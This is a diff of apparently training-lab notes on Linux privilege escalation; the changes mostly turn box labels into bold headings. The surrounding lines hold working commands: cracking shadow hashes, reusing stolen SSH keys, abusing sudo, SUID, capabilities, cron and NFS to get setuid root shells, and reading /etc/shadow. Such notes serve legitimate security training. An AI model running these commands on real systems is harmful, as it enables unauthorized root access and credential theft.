@@ -52,8 +52,6 @@ Now:
 	
 `hashcat -m 1800 unshadowed.txt rockyou.txt -O`
 
-''''
-
 # 5. Privilage Escalation - SSH Keys
 ## Detection
 1. In command prompt type:
@@ -63,11 +61,11 @@ Now:
 3. Note the results. 
 
 ## Exploitation
-<target box>
+**Target box**
 
 1. Copy the contents of the discovered id_rsa file to a file on your attacker VM.
 
-<attacker box>
+**Attacker box**
 
 1. In command prompt type: `chmod 400 id_rsa`
 2. In command prompt type: `ssh -i id_rsa root@<ip>`
@@ -87,20 +85,20 @@ d. `sudo vim -c '!sh' `
 # 7. Privilage Escalation - Sudo (Abusing Intended Functionality)
 ## Detection
 
-<target box>
+**Target box**
 
 1. In command prompt type: `sudo -l`
 2. From the output, notice the list of programs that can run via sudo.
 
 ## Exploitation
 
-<target box>
+**Target box**
 
 1. In command prompt type:
 `sudo apache2 -f /etc/shadow`
 2. From the output, copy the root hash.
 
-<attacker box>
+**Attacker box**
 
 1. Open command prompt and type:
 `echo '[Pasted Root Hash]' > hash.txt`
@@ -111,7 +109,7 @@ d. `sudo vim -c '!sh' `
 # 8. Privilage Escalation - Sudo (LD_PRELOAD) 
 ## Detection
 
-<target box>
+**Target box**
 
 1. In command prompt type: `sudo -l`
 2. From the output, notice that the LD_PRELOAD environment variable is intact.
@@ -141,7 +139,7 @@ void _init() {
 # 9. Privilage Escalation -  SUID (Shared Object Injection)
 ## Detection
 
-<target box>
+**Target box**
 
 1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
 2. From the output, make note of all the SUID binaries.
@@ -151,7 +149,7 @@ void _init() {
 
 ## Exploitation
 
-<target box>
+**Target box**
 
 5. In command prompt type: `mkdir /home/user/.config`
 6. In command prompt type: `cd /home/user/.config`
@@ -175,14 +173,14 @@ void inject() {
 # 10. Privilage Escalation -  SUID (Symlinks)
 ## Detection
 
-<target box>
+**Target box**
 
 1. In command prompt type: `dpkg -l | grep nginx`
 2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.
 
 ## Exploitation
 
-<target box> – Terminal 1
+**Target box** – Terminal 1
 
 1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: su root
 2. The root password is password123
@@ -190,14 +188,14 @@ void inject() {
 4. In command prompt type: `/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log`
 5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.
 
-<target box> – Terminal 2
+**Target box** – Terminal 2
 
 1. Once logged in, type: su root
 2. The root password is password123
 3. As root, type the following: invoke-rc.d nginx rotate >/dev/null 2>&1
 4. Switch back to the previous terminal.
 
-<target box> – Terminal 1
+**Target box** – Terminal 1
 
 1. From the output, notice that the exploit continued its execution.
 2. In command prompt type: id
@@ -205,7 +203,7 @@ void inject() {
 # 11. Privilage Escalation -  SUID (Environment Variables #1) 
 ## Detection
 
-<target box>
+**Target box**
 
 1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
 2. From the output, make note of all the SUID binaries.
@@ -214,7 +212,7 @@ void inject() {
 
 ## Exploitation
 
-<target box>
+**Target box**
 
 1. In command prompt type:
 `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c`
@@ -226,7 +224,7 @@ void inject() {
 # 12. Privilage Escalation - SUID (Environment Variables #2)
 ## Detection
 
-<target box>
+**Target box**
 
 1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
 2. From the output, make note of all the SUID binaries.
@@ -235,7 +233,7 @@ void inject() {
 
 ## Exploitation Method #1
 
-<target box>
+**Target box**
 
 1. In command prompt type:
 `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
@@ -245,7 +243,7 @@ void inject() {
 
 ## Exploitation Method #2
 
-<target box>
+**Target box**
 
 1. In command prompt type:
 `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'`
@@ -253,14 +251,14 @@ void inject() {
 # 13. Privilage Escalation - Capabilities
 ## Detection
 
-<target box>
+**Target box**
 
 1. In command prompt type: `getcap -r / 2>/dev/null`
 2. From the output, notice the value of the “cap_setuid” capability.
 
 Exploitation
 
-<target box>
+**Target box**
 
 1. In command prompt type:
 `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
@@ -269,14 +267,14 @@ Exploitation
 # 14. Privilage Escalation - Cron (Path) 
 ## Detection
 
-<target box>
+**Target box**
 
 1. In command prompt type: `cat /etc/crontab`
 2. From the output, notice the value of the “PATH” variable.
 
 ## Exploitation
 
-<target box>
+**Target box**
 
 1. In command prompt type:
 `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh`
@@ -288,7 +286,7 @@ Exploitation
 # 15. Privilage Escalation - Corn (Wildcards) 
 ## Detection
 
-<target box>
+**Target box**
 
 1. In command prompt type: `cat /etc/crontab`
 2. From the output, notice the script “/usr/local/bin/compress.sh”
@@ -297,7 +295,7 @@ Exploitation
 
 ## Exploitation
 
-<target box>
+**Target box**
 
 1. In command prompt type:
 `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh`
@@ -310,7 +308,7 @@ Exploitation
 # 16. Privilage Escalation - Corn (File Overwrite)
 ## Detection
 
-<target box>
+**Target box**
 
 1. In command prompt type: `cat /etc/crontab`
 2. From the output, notice the script “overwrite.sh”
@@ -319,7 +317,7 @@ Exploitation
 
 ## Exploitation
 
-<target box>
+**Target box**
 
 1. In command prompt type:
 `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`
@@ -330,14 +328,14 @@ Exploitation
 # 17. Privilage Escalation - NFS Root Squashing
 ## Detection
 
-<target box>
+**Target box**
 
 1. In command line type: `cat /etc/exports`
 2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.
 
 ## Exploitation
 
-<attacker box>
+**Attacker box**
 
 1. Open command prompt and type: `showmount -e 10.10.75.233`
 2. In command prompt type: `mkdir /tmp/1`
@@ -347,7 +345,7 @@ In command prompt type:
 4. In command prompt type: `gcc /tmp/1/x.c -o /tmp/1/x`
 5. In command prompt type: `chmod +s /tmp/1/x`
 
-<target box>
+**Target box**
 
 1. In command prompt type: `/tmp/x`
 2. In command prompt type: `id`
